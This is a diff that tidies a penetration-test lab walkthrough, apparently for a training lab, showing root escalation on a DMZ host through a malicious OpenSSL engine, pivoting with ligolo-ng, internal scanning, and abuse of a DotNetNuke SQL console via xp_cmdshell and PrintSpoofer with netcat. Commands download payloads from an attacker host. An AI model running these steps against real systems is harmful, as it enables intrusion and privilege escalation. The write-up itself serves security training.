@@ -785,16 +785,12 @@ IMPLEMENT_DYNAMIC_BIND_FN(bind)
 IMPLEMENT_DYNAMIC_CHECK_FN()
 ```
 
-bash
-
 ```bash
 gcc -fPIC -c exploit.c
 gcc -shared -o exploit.so exploit.o -lcrypto
 ```
 
-The compiled engine is transferred to the target and loaded through `sudo openssl`:
-
-bash
+The compiled poc is transferred to the target and loaded through `sudo openssl`:
 
 ```bash
 $ wget http://10.10.15.11:8081/exploit.so
@@ -812,8 +808,6 @@ exploit.so                  100%[===========================================>]  
 2026-11-10 20:38:40 (393 KB/s) - 'exploit.so' saved [15712/15712]
 ```
 
-bash
-
 ```bash
 $ chmod +x exploit.so
 $ sudo openssl req -engine ./exploit.so
@@ -826,8 +820,6 @@ Root access is obtained on `dmz01`.
 ---
 
 ## Flag (DMZ01 Root)
-
-bash
 
 ```bash
 root@dmz01:~# ls
@@ -846,8 +838,6 @@ a34985b5976072c3c148abc751671302
 ## Pivoting to the Internal Network (ligolo-ng)
 
 `dmz01` has several interfaces, but the one on the in-scope range is `ens192`:
-
-bash
 
 ```bash
 root@dmz01:~# ifconfig
@@ -870,8 +860,6 @@ ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
 
 A sweep of the scoped subnet confirms three live hosts:
 
-bash
-
 ```bash
 root@dmz01:~# for i in {1..254} ;do (ping -c 1 172.16.8.$i | grep "bytes from" &) ;done
 ```
@@ -885,15 +873,11 @@ root@dmz01:~# for i in {1..254} ;do (ping -c 1 172.16.8.$i | grep "bytes from" &
 
 The ligolo-ng proxy is started on Kali:
 
-bash
-
 ```bash
 sudo ligolo-proxy -selfcert
 ```
 
 The agent binary is served from Kali and downloaded/executed on `dmz01`:
-
-bash
 
 ```bash
 root@dmz01:~# wget http://10.10.15.11:8081/agent
@@ -910,8 +894,6 @@ agent                       100%[===========================================>]  
 
 2026-11-10 20:51:53 (1.24 MB/s) - 'agent' saved [7164088/7164088]
 ```
-
-bash
 
 ```bash
 root@dmz01:~# chmod +x agent
@@ -959,8 +941,6 @@ INFO[0387] Starting tunnel to root@dmz01 (0050568a405f)
 
 The tunnel is verified with an SMB sweep:
 
-bash
-
 ```bash
 netexec smb 172.16.8.0/23
 ```
@@ -975,8 +955,6 @@ Running nxc against 512 targets ━━━━━━━━━━━━━━━━
 ### Internal Host Enumeration
 
 `172.16.8.3` is confirmed as the domain controller:
-
-bash
 
 ```bash
 nmap -sC -sV 172.16.8.3 --open
@@ -1007,7 +985,6 @@ Host script results:
 |_    Message signing enabled and required
 ```
 
-bash
 
 ```bash
 sudo nmap -sT -Pn 172.16.8.20 -sV -sC
@@ -1047,7 +1024,7 @@ Host script results:
 |_nbstat: NetBIOS name: ACADEMY-AEN-DEV, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:8a:12:09 (VMware)
 ```
 
-bash
+
 
 ```bash
 sudo nmap -sT -Pn 172.16.8.50 -sV -sC
@@ -1079,29 +1056,24 @@ Host script results:
 
 `DC01` is added to the hosts file:
 
-bash
-
 ```bash
 echo "172.16.8.3 DC01.INLANEFREIGHT.LOCAL DC01" | sudo tee -a /etc/hosts
 ```
 
 ---
 
-## DEV01 (172.16.8.20) — DotNetNuke Exploitation
+## DEV01 (172.16.8.20)
 
 Web enumeration discloses a DotNetNuke (DNN) installation:
 
-./dev01/1.png
+![](./dev01/1.png)
 
 The NFS export is mounted locally:
-
-bash
 
 ```bash
 sudo mount -t nfs 172.16.8.20:/ ~/labs/aen/ -o nolock
 ```
 
-bash
 
 ```bash
 ┌──(kali㉿kali)-[~/labs/aen]
@@ -1109,8 +1081,6 @@ bash
 ┌──(kali㉿kali)-[~/labs/aen/DEV01/DNN]
 └─$ cat web.config
 ```
-
-xml
 
 ```xml
 <?xml version="1.0"?>
@@ -1128,13 +1098,11 @@ xml
 
 Logging in as `Administrator` grants access to the admin dashboard ([DNN enumeration reference](https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/dotnetnuke-dnn.html)):
 
-./dev01/2.png
+![](./dev01/2.png)
 
 ### Enabling xp_cmdshell
 
 DNN's built-in SQL console is used to enable and invoke `xp_cmdshell`:
-
-sql
 
 ```sql
 EXEC sp_configure 'show advanced options', 1;
@@ -1145,21 +1113,21 @@ GO
 xp_cmdshell 'whoami';
 ```
 
-./dev01/3.png
+![](./dev01/3.png)
 
 Running `xp_cmdshell 'whoami /priv';` reveals the SQL service account holds `SeImpersonatePrivilege`:
 
-./dev01/4.png
+![](./dev01/4.png)
 
 ### SeImpersonatePrivilege Abuse
 
 `.exe` is added to the allowed upload extensions under **Settings → Security → More → More Security Settings**:
 
-./dev01/5.png
+![](./dev01/5.png)
 
 `PrintSpoofer64.exe` and `nc64.exe` are uploaded through **Admin → File Management**, landing under `C:\DotNetNuke\Portals\0`:
 
-./dev01/6.png
+![](./dev01/6.png)
 
 `xp_cmdshell` is used to trigger PrintSpoofer with a reverse shell payload:
 
